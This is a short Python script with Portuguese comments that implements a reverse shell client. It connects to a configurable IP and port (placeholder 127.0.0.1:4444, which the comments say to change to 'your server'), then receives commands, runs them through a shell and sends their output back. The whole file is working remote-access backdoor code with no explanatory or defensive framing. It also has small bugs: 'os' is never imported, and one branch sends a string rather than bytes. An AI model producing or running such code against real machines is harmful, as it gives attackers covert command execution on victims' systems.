import socket
import subprocess

def connect():
    # Endereço IP e porta para se conectar
    ip = '127.0.0.1' # Altere para o endereço IP do seu servidor
    port = 4444 # Altere para a porta que deseja usar

    # Cria um socket e se conecta ao servidor
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
    except Exception as e:
        return None

    # Envia a mensagem de confirmação da conexão para o servidor
    s.send('[+] Conexão estabelecida.'.encode())

    return s

def listen(s):
    while True:
        # Recebe o comando do servidor
        data = s.recv(1024).decode()

        # Executa o comando e envia a saída de volta para o servidor
        if data.startswith('cd'):
            try:
                os.chdir(data[3:])
                output = ''
            except Exception as e:
                output = str(e)
        else:
            output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = output.stdout.read() + output.stderr.read()

        s.send(output)

s = connect()

if s:
    listen(s)
else:
    print('[-] Não foi possível se conectar ao servidor.')
